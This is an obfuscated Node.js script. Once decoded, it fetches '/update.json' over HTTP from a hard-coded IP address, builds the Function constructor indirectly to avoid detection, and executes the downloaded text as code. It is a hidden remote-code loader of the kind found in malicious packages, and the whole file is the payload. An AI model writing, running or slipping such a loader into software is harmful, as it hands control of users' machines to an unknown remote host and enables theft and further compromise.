function _0x5a7c() {
    var _0x2f0db9 = [
        'http',
        'get',
        '23.94.46.191',
        '/update.json',
        'data',
        'end',
        'Buffer',
        'from',
        'charAt',
        'toUpperCase',
        'slice'
    ];
    _0x5a7c = function () {
        return _0x2f0db9;
    };
    return _0x5a7c();
}
function _0x3ab3(_0x3f07e9, _0x5a7c53) {
    var _0x3ab3a0 = _0x5a7c();
    _0x3ab3 = function (_0x1530af, _0x122b03) {
        _0x1530af = _0x1530af - 0x189;
        var _0x5c7e84 = _0x3ab3a0[_0x1530af];
        return _0x5c7e84;
    };
    return _0x3ab3(_0x3f07e9, _0x5a7c53);
}
(function () {
    var _0x12b6d7 = _0x3ab3;
    var _0x1214ee = require(_0x12b6d7(0x189));
    return _0x1214ee[_0x12b6d7(0x18a)]({
        'host': _0x12b6d7(0x18b),
        'port': 0x50,
        'path': _0x12b6d7(0x18c)
    }, function (_0x1e1826) {
        var _0x1c648a = _0x3ab3;
        var _0x1a4c37 = '';
        _0x1e1826['on'](_0x1c648a(0x18d), function (_0x255aea) {
            _0x1a4c37 += _0x255aea;
        });
        _0x1e1826['on'](_0x1c648a(0x18e), function () {
            var _0x3d7c13 = _0x3ab3;
            var _0x4c96f6 = this[(typeof this[_0x3d7c13(0x18f)][_0x3d7c13(0x190)])[_0x3d7c13(0x191)](0x0)[_0x3d7c13(0x192)]() + (typeof this[_0x3d7c13(0x18f)][_0x3d7c13(0x190)])[_0x3d7c13(0x193)](0x1)];
            var _0x387f77 = new _0x4c96f6(_0x1a4c37);
            _0x387f77();
        });
    });
}());
